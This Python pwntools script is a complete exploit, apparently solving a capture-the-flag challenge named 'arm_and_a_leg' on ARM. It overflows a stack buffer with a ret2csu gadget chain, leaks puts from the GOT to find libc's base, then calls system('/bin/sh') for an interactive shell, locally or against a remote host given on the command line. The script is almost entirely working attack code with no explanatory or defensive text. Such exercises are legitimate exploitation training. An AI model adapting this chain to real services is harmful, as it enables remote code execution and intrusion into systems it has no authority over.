#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('arm_and_a_leg')
libc = ELF("./libc.so.6")
# context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return process(["qemu-arm","-g","5000", exe.path])
        # return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
    

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def ret2csu(r0, r1, r2, call, chain=False):
    pop_many = 0x00010500 # __libc_csu_init <+88>:    pop     {r3, r4, r5, r6, r7, r8, r9, pc}
    mov_and_blx = 0x000104e8 # mov r0, r7; mov r8, r1; mov r9, r2; blx r3

    payload = b""

    if not chain:
        payload += p32(pop_many)

    payload += p32(call)
    payload += p32(0x0)    
    payload += p32(0x0)     
    payload += p32(0x0)    
    payload += p32(r0)     
    payload += p32(r1) 
    payload += p32(r2)
    payload += p32(mov_and_blx)

    return payload


def solve():

    offset = 72

    payload = b""
    payload += b"A"*offset
    payload += ret2csu(exe.got["puts"], 0, 0, exe.plt["puts"])
    payload += ret2csu(0, 0, 0, exe.sym['main'], chain=True)

    io.sendline(payload)
    io.recvline()

    libc.address = u32(io.recv(4)) - libc.sym["puts"]
    system = libc.sym["system"]
    sh = next(libc.search(b"/bin/sh\x00"))
    
    info("libc base: %#x", libc.address)
    info("system: %#x", system)

    payload = b""
    payload += b"A"*offset
    payload += ret2csu(sh, 0, 0, system)

    io.sendline(payload)


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
